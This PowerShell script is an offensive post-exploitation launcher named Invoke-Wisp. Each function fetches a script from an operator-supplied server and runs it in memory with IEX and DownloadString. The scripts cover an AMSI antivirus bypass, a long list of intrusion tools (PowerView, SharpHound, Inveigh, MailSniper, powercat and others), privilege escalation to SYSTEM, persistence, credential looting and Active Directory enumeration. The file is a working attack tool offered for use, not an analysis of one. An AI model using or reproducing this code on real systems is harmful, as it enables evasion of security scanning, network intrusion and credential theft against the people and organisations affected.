<#
    CREATED BY KARMAZ
#>
$global:url_1029384756=$null
$global:mem_1029384756=$null

function Invoke-Wisp {
    [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
    Param([string]$url)
    $global:url_1029384756=$url
    . bypass_amsi
}

function Bypass_AMSI {
    if($global:url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url 'http://<your_server>/' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/isma.txt")
}

function Memory_Load {
    if($url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url 'http://<your_server>/' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/HostRecon.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PrivescCheck.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerUp.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerView.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SharpHound.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/adPEAS.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/LAPSToolkit.txt")
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/Invoke-Portscan.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerView.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SessionGopher.ps1")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh.ps1")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh-Relay.ps1")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Seatbelt.ps1")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/MailSniper.ps1")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/powercat.txt")
    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Sharpweb.ps1")
    $global:mem_1029384756=1
}

function Escalation {
    if($url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/escalate.txt")
}

function fortification {
    if($url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/fort.txt")
    if($mem_1029384756 -eq $null){
        . Memory_Load
    }
}

function looting {
    if($url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    . fortification
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/loot.txt")
}

function get_system {
    if($url_1029384756 -eq $null){
        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
        Write-Host -NoNewline -ForegroundColor Yellow " Use "
        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
        return
    }
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/la_to_sys.txt")
}

function is64 {[Environment]::Is64BitProcess}

function ad_enumerator {
    Param(
        [Parameter(Mandatory, HelpMessage = "Please provide a domain -domain 'domain.com'")]
        [string]$domain,
        [string]$user,
        [string]$pass,
        [switch]$asme
    )
    $global:asme_1029384756=$asme
    $global:domain_1029384756=$domain
    $global:user_1029384756=$user
    $global:pass_1029384756=$pass
    if($mem_1029384756 -eq $null){
        . Memory_Load
    }
    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/ad_enum.txt")
}